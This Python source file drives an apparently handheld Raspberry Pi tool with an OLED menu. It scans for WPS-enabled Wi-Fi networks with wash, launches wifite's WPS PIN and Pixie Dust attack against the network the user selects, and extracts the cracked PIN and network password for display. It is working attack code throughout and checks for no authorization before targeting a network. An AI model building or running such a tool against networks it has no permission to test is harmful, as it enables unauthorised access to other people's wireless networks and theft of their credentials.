# modules/attack_wps.py
import os
import re
import signal
import subprocess
import time
import queue
import threading
import RPi.GPIO as GPIO

import config
from gui import oled_menu

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))


# ------------------------------------------------------------------ #
#  UTILIDADES COMPARTIDAS                                            #
# ------------------------------------------------------------------ #
def clean_ansi(text):
    """Elimina códigos de escape ANSI (colores de terminal)."""
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', text)


def enqueue_output(out, q):
    """Hilo secundario para leer la salida de subprocesos sin bloquear la UI."""
    for line in iter(out.readline, ''):
        q.put(line)
    out.close()


def stop_process(proc):
    """Termina de forma segura un grupo de procesos."""
    if proc and proc.poll() is None:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        except Exception:
            pass


# ------------------------------------------------------------------ #
#  ESCANEO WPS CON WASH                                              #
# ------------------------------------------------------------------ #
def scan_wps_networks(interfaz=None, tiempo_escaneo=12):
    """
    Ejecuta 'wash' durante N segundos y parsea las redes con WPS activo.
    Devuelve una lista de dicts: bssid, essid, ch, signal, locked, vendor.
    """
    if interfaz is None:
        interfaz = config.INTERFACE

    oled_menu.show_message("ESCANEANDO WPS", "Ejecutando wash...", "Espere un momento")

    # 'timeout' nos asegura que wash muera solo, sin dejar la interfaz bloqueada
    cmd = f"sudo timeout {tiempo_escaneo} wash -i {interfaz}"

    try:
        resultado = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=tiempo_escaneo + 5,
        )
        stdout = resultado.stdout or ""
    except subprocess.TimeoutExpired:
        stdout = ""

    # BSSID            Ch  dBm  WPS   Lck  Vendor     ESSID
    # C6:16:C8:6D:7A:54  4  -85  2.0   No   Unknown    quechuandes
    patron = re.compile(
        r"^([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})\s+"  # BSSID
        r"(\d+)\s+"                                     # canal
        r"(-?\d+)\s+"                                   # señal dBm
        r"([\d\.]+)\s+"                                 # versión WPS
        r"(Yes|No)\s+"                                  # Locked
        r"(\S+)\s+"                                     # Vendor
        r"(.+)$"                                        # ESSID
    )

    redes = []
    for linea in stdout.splitlines():
        linea = linea.strip()
        m = patron.match(linea)
        if m:
            bssid, ch, dbm, wps_ver, locked, vendor, essid = m.groups()
            redes.append({
                "bssid": bssid,
                "essid": essid.strip() or "Oculta",
                "ch": ch,
                "signal": int(dbm),
                "locked": locked.lower() == "yes",
                "vendor": vendor,
            })

    # Ordenar por potencia de señal (más fuerte primero)
    redes.sort(key=lambda r: r["signal"], reverse=True)
    return redes


# ------------------------------------------------------------------ #
#  ATAQUE WPS CON WIFITE                                             #
# ------------------------------------------------------------------ #
def run_wifite_wps(target_bssid):
    """
    Lanza wifite en modo WPS-only contra el BSSID indicado.
    Wifite por debajo usa reaver/bully para el ataque de PIN.
    """
    cmd = [
        "sudo", "wifite",
        "-i", config.INTERFACE,
        "-b", target_bssid,
        "--wps-only",     # solo WPS (sin handshake / PMKID)
        "--no-pmkid",
        "--kill",
    ]
    return subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        preexec_fn=os.setsid,
    )


# ------------------------------------------------------------------ #
#  BUCLE PRINCIPAL (MENÚ OLED + 3 BOTONES)                           #
# ------------------------------------------------------------------ #
def start_wps_attack_loop():
    """Bucle principal del módulo WPS con UI normalizada (igual que handshake)."""
    if not config.INTERFACE:
        oled_menu.show_message("ERROR INTERFAZ", "No hay tarjeta", "en modo monitor")
        time.sleep(2)
        return

    # --- 1. ESCANEO PREVIO ---
    wifi_list = scan_wps_networks(tiempo_escaneo=12)

    items_menu = ["<- VOLVER"]
    if wifi_list:
        for red in wifi_list:
            marca = " [L]" if red["locked"] else ""
            items_menu.append(f"{red['essid'][:16]}{marca}")
    else:
        items_menu.append("Sin redes WPS")

    estado = "LISTA"
    index = 0
    wifite_proc = None
    out_queue = None
    target = None

    pin_final = ""
    psk_final = ""

    try:
        while True:
            # ---------------------------------------------- #
            # ESTADO 1: MENÚ DE SELECCIÓN                     #
            # ---------------------------------------------- #
            if estado == "LISTA":
                oled_menu.draw_menu("WPS ATTACK", items_menu, index)

                if GPIO.input(config.BTN_UP) == GPIO.LOW:
                    index = (index - 1) % len(items_menu)
                    time.sleep(0.2)
                elif GPIO.input(config.BTN_DOWN) == GPIO.LOW:
                    index = (index + 1) % len(items_menu)
                    time.sleep(0.2)
                elif GPIO.input(config.BTN_SELECT) == GPIO.LOW:
                    time.sleep(0.3)

                    if index == 0:
                        return

                    if wifi_list and index <= len(wifi_list):
                        target = wifi_list[index - 1]
                        pin_final = ""
                        psk_final = ""

                        if target["locked"]:
                            oled_menu.show_message(
                                "WPS BLOQUEADO",
                                target["essid"][:16],
                                "El ataque puede fallar"
                            )
                            time.sleep(1.5)

                        oled_menu.show_message(
                            "INICIANDO WPS",
                            target["essid"][:16],
                            "Buscando PIN..."
                        )

                        wifite_proc = run_wifite_wps(target["bssid"])

                        out_queue = queue.Queue()
                        t = threading.Thread(
                            target=enqueue_output,
                            args=(wifite_proc.stdout, out_queue),
                        )
                        t.daemon = True
                        t.start()

                        estado = "ATACANDO"
                        time.sleep(0.5)

            # ---------------------------------------------- #
            # ESTADO 2: ATAQUE EN CURSO                       #
            # ---------------------------------------------- #
            elif estado == "ATACANDO":
                try:
                    line = out_queue.get_nowait()
                    line_clean = clean_ansi(line.strip())

                    # --- Mensajes de progreso en OLED ---
                    if "Trying PIN" in line_clean or "Trying pin" in line_clean:
                        pin_try = line_clean.split()[-1][:8]
                        oled_menu.show_message(
                            "PROBANDO PIN",
                            pin_try,
                            target["essid"][:16]
                        )
                    elif "Pixie" in line_clean or "pixie" in line_clean:
                        oled_menu.show_message(
                            "PIXIE DUST",
                            "Ataque offline",
                            target["essid"][:16]
                        )
                    elif "WPS lock" in line_clean or "AP Locked" in line_clean:
                        oled_menu.show_message(
                            "AP BLOQUEADO",
                            "El router bloqueó",
                            "Reintente luego"
                        )

                    # --- Captura de PIN ---
                    m_pin = re.search(
                        r"(?:WPS PIN|Cracked WPS PIN)[:\s'\"\[]*([0-9]{4,8})",
                        line_clean, re.IGNORECASE,
                    )
                    if m_pin:
                        pin_final = m_pin.group(1)

                    # --- Captura de PSK (password) ---
                    m_psk = re.search(
                        r"(?:WPS PSK|Cracked WPS PSK|PSK)[:\s'\"\[]*([^\s'\"]+)",
                        line_clean, re.IGNORECASE,
                    )
                    if m_psk:
                        psk_final = m_psk.group(1)

                    # --- Fin del proceso ---
                    if any(k in line_clean for k in
                           ["Finished", "exiting", "Quitting", "Stopping"]):
                        stop_process(wifite_proc)
                        estado = "RESULTADO"

                except queue.Empty:
                    pass

                # Cancelación manual
                if GPIO.input(config.BTN_SELECT) == GPIO.LOW:
                    stop_process(wifite_proc)
                    oled_menu.show_message("CANCELADO", "Ataque detenido", "por usuario")
                    time.sleep(1.5)
                    return

            # ---------------------------------------------- #
            # ESTADO 3: RESULTADOS                            #
            # ---------------------------------------------- #
            elif estado == "RESULTADO":
                oled_menu.clear_screen()
                oled_menu.draw.text(
                    (0, 0), f"RED: {target['essid'][:14]}",
                    font=oled_menu.font, fill=255
                )

                if psk_final:
                    oled_menu.draw_wrapped_text(f"KEY: {psk_final}", 16)
                elif pin_final:
                    oled_menu.draw.text(
                        (0, 20), f"PIN: {pin_final}",
                        font=oled_menu.font, fill=255
                    )
                    oled_menu.draw.text(
                        (0, 36), "(usar para PSK)",
                        font=oled_menu.font, fill=255
                    )
                else:
                    oled_menu.draw.text(
                        (0, 20), "Sin resultado",
                        font=oled_menu.font, fill=255
                    )

                oled_menu.draw.text(
                    (0, 54), "SELECT: Volver",
                    font=oled_menu.font, fill=255
                )
                oled_menu.refresh()

                if GPIO.input(config.BTN_SELECT) == GPIO.LOW:
                    time.sleep(0.3)
                    return

            time.sleep(0.05)

    finally:
        stop_process(wifite_proc)


# ------------------------------------------------------------------ #
#  TEST RÁPIDO DESDE TERMINAL (sin OLED)                             #
# ------------------------------------------------------------------ #
if __name__ == "__main__":
    redes = scan_wps_networks(tiempo_escaneo=8)
    print(f"\n[+] Se encontraron {len(redes)} redes con WPS:")
    for i, red in enumerate(redes):
        lock = "LOCKED" if red["locked"] else "OK"
        print(f"{i+1}. {red['essid'][:15]:<15} | {red['bssid']} | "
              f"{red['signal']}dBm | ch{red['ch']} | [{lock}]")
